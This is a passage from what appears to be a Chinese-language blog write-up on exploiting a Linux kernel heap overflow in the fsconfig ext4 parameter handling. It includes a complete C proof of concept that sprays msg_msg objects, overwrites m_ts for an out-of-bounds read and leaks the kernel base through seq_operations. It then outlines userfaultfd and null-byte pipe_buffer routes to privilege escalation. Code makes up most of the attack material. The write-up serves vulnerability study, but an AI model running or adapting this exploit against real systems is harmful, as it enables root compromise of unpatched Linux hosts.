class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-built_in">memset</span>(pat, <span class="hljs-number">0x42</span>, <span class="hljs-keyword">sizeof</span>(pat));<br>   pat[<span class="hljs-keyword">sizeof</span>(pat) - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br>   <br>   <br>   info_log(<span class="hljs-string">&quot;Opening the ext4 filesystem&quot;</span>);<br>   fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>   <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>       <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Opening&quot;</span>);<br>       <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>   &#125;<br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">186</span>; i++) &#123;<br>       fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">0</span>);<br>   &#125;<br>   fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">/* overflow, hopefully causes an OOB read on a potential msg_msg object below */</span><br>   info_log(<span class="hljs-string">&quot;Overflowing...&quot;</span>);<br>   pat[<span class="hljs-number">21</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br>   <span class="hljs-type">char</span> evil[] = <span class="hljs-string">&quot;\x60\x10&quot;</span>;<br>   <span class="hljs-comment">/* it will write 23(21 + &#x27;,&#x27; + &#x27;=&#x27;) bytes</span><br><span class="hljs-comment">    * but the up(4095) reserve &#x27;\x00&#x27;, one byte</span><br><span class="hljs-comment">    * so this time we overflow 22 byte </span><br><span class="hljs-comment">    * */</span><br>   fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, pat, <span class="hljs-number">0</span>);<br>   <br>   <span class="hljs-comment">// spray more msg_msg</span><br>   <span class="hljs-comment">/* it will spray the legacy data in some one spraying obj </span><br><span class="hljs-comment">    * that is because kmalloc-cg-4k from a 8K chunk :)</span><br><span class="hljs-comment">    * it could include 8 kmalloc-cg-4k</span><br><span class="hljs-comment">    * we can use cmd [sudo cat /proc/slabinfo] for checking</span><br><span class="hljs-comment">    * */</span><br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">8</span>; i &lt; <span class="hljs-number">0x10</span>; i++) <br>   &#123;<br>       <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0x41</span>+i, <span class="hljs-keyword">sizeof</span>(buffer));<br>       targets[i] = get_msg(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>       send_msg(targets[i], message, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);<br>   &#125;<br>   <br>   info_log(<span class="hljs-string">&quot;overflow the msg-&gt;m_ts&quot;</span>);<br>   fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, evil, <span class="hljs-number">0</span>);<br><br></code></pre></td></tr></table></figure><p>最后的fsconfig实际上就是在大概率写到msg_msg头部的情况下覆盖msg_msg-&gt;m_ts字段，制造出一个大数字的读取,下图就是我们恰好堆喷到我们溢出的部分</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/f31fbe096b63f6247571ef32c144ebf81a4ca3d7.jpg"></p><p>下图就是我们最后一次fsconfig的情况</p><p><img src="http://imgsrc.baidu.com/forumm/pic/item/b999a9014c086e06eb86e97a44087bf40ad1cbd2.jpg"></p><p>可以看到我们的m_ts字段被修改为了0x1060,这样以来我们就可以越界进行读取，大伙还记得上面额外分配的kmalloc-32吗，接下来就得靠它了，之前顺便堆喷他的原因是为了让我们的seq_operation和他有一定概率出现在同一个slab里面</p><p>之后后面的泄露就是寻常化了，直接利用msgrcv系统调用，造成OOB_read，越界读取额外的msg_msgseg相邻的seq_operations函数指针，如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">seq_operations</span> &#123;<br><span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-built_in">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br><span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-built_in">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>经过调试过程可得知，该seq_operations-&gt;start函数初始化为内核中的<code>single_start</code>函数，这样以来我们就可以实现内核基地址的泄露了</p><p>即可成功泄露基地址，但是我目前泄露是失败的，之后再看:(</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c2fdfc039245d688701c6395e2c27d1ed21b24e1.jpg"></p><p>之后发现这里应该是由于多核心的缘故，导致<code>kmalloc</code>有一定几率转到别的核心CPU上面分配，所以导致的失败，所以这里进行一个简单的绑核即可寻找到固定偏移，如下：（后期考证也发现不绑核也可以成功，但成功率会大大下降，所以这里我们绑核了较好）</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7dd98d1001e939016c1a510f3dec54e736d196e3.jpg"></p><p>下面的泄露poc也进行了相应修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IPC_PRIVATE (long)0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IPC_CREAT  00001000   <span class="hljs-comment">/* create if key is nonexistent */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IPC_NOWAIT 00004000   <span class="hljs-comment">/* return error on wait */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_NOERROR     010000  <span class="hljs-comment">/* no error if message is too big */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY        040000  <span class="hljs-comment">/* copy (not remove) all queue messages */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SINGLE_START_OFFSET 0x35f200</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_msgget</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_msgget 186</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_msgget</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_msgsnd 189</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_msgget</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_msgrcv 188</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">int</span> fd;                 <span class="hljs-comment">/* using by filesystem */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">long</span> mtype;          <span class="hljs-comment">/* type of message */</span><br><span class="hljs-type">char</span> mtext[<span class="hljs-number">1</span>];                  <span class="hljs-comment">/* message text */</span><br><br>&#125;msg;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:0x%lx\n&quot;</span>, str, x)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[-]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">get_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> key, <span class="hljs-type">int</span> msgflg)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgget(key, msgflg);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">send_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">int</span> msgflg)</span>&#123;<br><br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, msgflg);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">recv_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp, <span class="hljs-type">int</span> msgflg)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, msgflg);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">do_check_leak</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span> <br>&#123;<br>    <span class="hljs-type">uint64_t</span> kbase = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)buf)[<span class="hljs-number">510</span>];<br>    <span class="hljs-keyword">if</span>(!kbase)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;   <br>    kbase -= SINGLE_START_OFFSET; <br>    <span class="hljs-keyword">return</span> kbase;<br>&#125;<br><br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">do_leak</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">uint64_t</span> kernel_base;<br>    <span class="hljs-type">char</span> pat[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x2000</span>] = &#123;<span class="hljs-number">0</span>&#125;, recieved[<span class="hljs-number">0x2000</span>] = &#123;<span class="hljs-number">0</span>&#125;;      <span class="hljs-comment">//PAGE_SIZE*2</span><br>    <span class="hljs-type">int</span> targets[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    msg* message = (msg* )(buffer); <br>    <span class="hljs-type">int</span> size = <span class="hljs-number">0x1018</span>;      <br>    <span class="hljs-comment">/* msg_msg: (0x30)head, (0xfd0)message_0</span><br><span class="hljs-comment">     * msg_msgseg: (0x8)head, (0x18)message_1, for kmalloc-32 :)</span><br><span class="hljs-comment">     * */</span><br><br>    <span class="hljs-comment">/* spray the msg_msg */</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)&#123;<br>        <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0x41</span>+i, <span class="hljs-keyword">sizeof</span>(buffer));<br>        targets[i] = get_msg(IPC_PRIVATE, <span class="hljs-number">0666</span>|IPC_CREAT);<br>        send_msg(targets[i], message, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);      <span class="hljs-comment">/* spray the 0x1018 msg_msg from the kmalloc-4k */</span><br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(pat, <span class="hljs-number">0x42</span>, <span class="hljs-keyword">sizeof</span>(pat));<br>    pat[<span class="hljs-keyword">sizeof</span>(pat) - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br>    <br>    <br>    info_log(<span class="hljs-string">&quot;Opening the ext4 filesystem&quot;</span>);<br>    fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Opening&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">186</span>; i++) &#123;<br>        fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* overflow, hopefully causes an OOB read on a potential msg_msg object below */</span><br>    info_log(<span class="hljs-string">&quot;Overflowing...&quot;</span>);<br>    pat[<span class="hljs-number">21</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br>    <span class="hljs-type">char</span> evil[] = <span class="hljs-string">&quot;\x60\x10&quot;</span>;<br>    <span class="hljs-comment">/* it will write 23(21 + &#x27;,&#x27; + &#x27;=&#x27;) bytes</span><br><span class="hljs-comment">     * but the up(4095) reserve &#x27;\x00&#x27;, one byte</span><br><span class="hljs-comment">     * so this time we overflow 22 byte </span><br><span class="hljs-comment">     * */</span><br>    fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, pat, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">// spray more msg_msg</span><br>    <span class="hljs-comment">/* it will spray the legacy data in some one spraying obj </span><br><span class="hljs-comment">     * that is because kmalloc-cg-4k from a 8K chunk :)</span><br><span class="hljs-comment">     * it could include 8 kmalloc-cg-4k</span><br><span class="hljs-comment">     * we can use cmd [sudo cat /proc/slabinfo] for checking</span><br><span class="hljs-comment">     * */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">8</span>; i &lt; <span class="hljs-number">0x10</span>; i++) <br>    &#123;<br>        <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0x41</span>+i, <span class="hljs-keyword">sizeof</span>(buffer));<br>        targets[i] = get_msg(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>        send_msg(targets[i], message, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    info_log(<span class="hljs-string">&quot;overflow the msg-&gt;m_ts&quot;</span>);<br>    fsconfig(fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, evil, <span class="hljs-number">0</span>);<br>    <br>    info_log(<span class="hljs-string">&quot;heap overflow done&quot;</span>);<br>    info_log(<span class="hljs-string">&quot;Start spraying kmalloc-32 for seq_operations&quot;</span>);<br>    <br>    size = <span class="hljs-number">0x1060</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)&#123;<br>        open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    &#125; <br>    <br>    info_log(<span class="hljs-string">&quot;Recieving the leak data...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0x10</span>; j++)&#123;<br>        recv_msg(targets[j], recieved, size, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);<br>        kernel_base = do_check_leak(recieved);<br>        <span class="hljs-comment">//kernel_base = ((unsigned long *)recieved)[511];</span><br>        <span class="hljs-keyword">if</span>(kernel_base)&#123;<br>            PRINT_ADDR(<span class="hljs-string">&quot;kernel_base&quot;</span>, kernel_base);<br>            close(fd);<br>            <span class="hljs-keyword">return</span> kernel_base;<br>        &#125;<br>    &#125;<br>    error_log(<span class="hljs-string">&quot;leak kernel_base failed!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    unshare(CLONE_NEWNS | CLONE_NEWUSER);<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    do_leak();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="2-userfaultfd利用"><a href="#2-userfaultfd利用" class="headerlink" title="2.userfaultfd利用"></a>2.userfaultfd利用</h2><p>泄露完内核基地址后，我们就该考虑如何进行利用了，这里在读完源码之后可以发现，在我们调用msgsnd的过程中，走到load_msg这样一个函数，会使用copy_from_user来将我们传入的buf传递给创建的msg当中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">load_msg</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">seg</span>;</span><br><span class="hljs-type">int</span> err = -EFAULT;<br><span class="hljs-type">size_t</span> alen;<br><br>msg = alloc_msg(len);<br><span class="hljs-keyword">if</span> (msg == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br>alen = min(len, DATALEN_MSG);<br><span class="hljs-keyword">if</span> (copy_from_user(msg + <span class="hljs-number">1</span>, src, alen)) <span class="hljs-comment">//这里会访问到我们的 __user *src指针，那么此时可以发动我们的userfaultfd来将其卡在这里</span><br><span class="hljs-keyword">goto</span> out_err;<br><br><span class="hljs-keyword">for</span> (seg = msg-&gt;next; seg != <span class="hljs-literal">NULL</span>; seg = seg-&gt;next) &#123;<br>len -= alen;<br>src = (<span class="hljs-type">char</span> __user *)src + alen;<br>alen = min(len, DATALEN_SEG);<br><span class="hljs-keyword">if</span> (copy_from_user(seg + <span class="hljs-number">1</span>, src, alen))<br><span class="hljs-keyword">goto</span> out_err;<br>&#125;<br><br>err = security_msg_msg_alloc(msg);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">goto</span> out_err;<br><br><span class="hljs-keyword">return</span> msg;<br><br>out_err:<br>free_msg(msg);<br><span class="hljs-keyword">return</span> ERR_PTR(err);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们知道，当我们走到load_msg的时候，会首先通过<code>alloc_msg</code>来分配一个msg_msg数据结构，很有可能也包括msg_msgseg，分配好空间返回到load_msg后，则会调用copy_from_user来将我们用户空间的内容复制到msg_msg当中，这时如果我们在分配好空间之后，调用copy_from_user之前将我们分配的msg_msg-&gt;next指针修改一下，那么就可以达成一个任意写的功效</p><p>需要实现这样时机巧妙的操作，在内核版本5.11以前我们可以利用userfaultfd这样的条件竞争手法</p><h2 id="3-空字节堆溢出"><a href="#3-空字节堆溢出" class="headerlink" title="3.空字节堆溢出"></a>3.空字节堆溢出</h2><p>该解法甚是巧妙，第一次出现于<a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">arttnba3师傅在d3ctf中的出题笔记</a>并被应用到该漏洞之中，该解法既可以在简单的pwn环境下使用，也可以不用考虑到内核5.11后userfaultfd的使用权限问题。且仅需要堆溢出1个空字节即可完成提权。牛牛爆了(bushi</p><h3 id="1-初期知识准备"><a href="#1-初期知识准备" class="headerlink" title="1.初期知识准备"></a>1.初期知识准备</h3><p>我们该如何使用仅仅一个字节来达成地址泄露甚至说是权限提升呢？这里我们考虑到某些结构体，在不破坏其结构形式的情况下，仅溢出一字节是一个很好的办法，但是介于内核中地址的随机性，我们不如将其定为溢出空字节</p><p>如果说这里我们溢出到的某个结构体开头第一个字段为一个指针，那么这样我们就可以修改指针地址，使其指向我们尽可能可以操纵的地区，这里根据博客的提示，我们就可以选用pipe_buffer这个结构体进行利用，他的数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 